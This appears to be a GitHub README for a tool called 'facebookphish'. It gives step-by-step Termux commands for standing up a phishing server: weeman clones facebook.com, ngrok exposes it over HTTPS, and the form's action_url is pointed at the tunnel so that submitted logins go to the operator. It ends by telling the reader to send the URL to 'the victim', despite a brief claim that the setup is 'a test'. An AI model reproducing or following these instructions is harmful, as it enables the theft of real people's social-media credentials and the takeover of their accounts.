# facebookphish
Download tools and updates needed for a test of phishing Facebook accounts
All this can be done on termux
This python script download apt, python2, wget, git, ngrok, weeman

You need to have already installed python3 for make this work.

After everything is finished you need 2 sessions on termux

1. first session you need to go to weeman dir (cd weeman/) and type python2 weeman.py. Now type show to see instructions.

2. In the second session type ngrok http -bind-tls=true 8080 (choose your own port) and enter for start. (bind-tls is for https page) Now, ngrok give an url like xxxx.ngrok.io, copy that and paste in the session 1 for weeman. First type set url https://facebook.com and after that type the command set action_url here goes your ngrok url. And the last one, type set port and type the port you choose for ngrok before (8080 in my example). And thats all, now you will have working that server on your own pc and now just send that url to the victim.
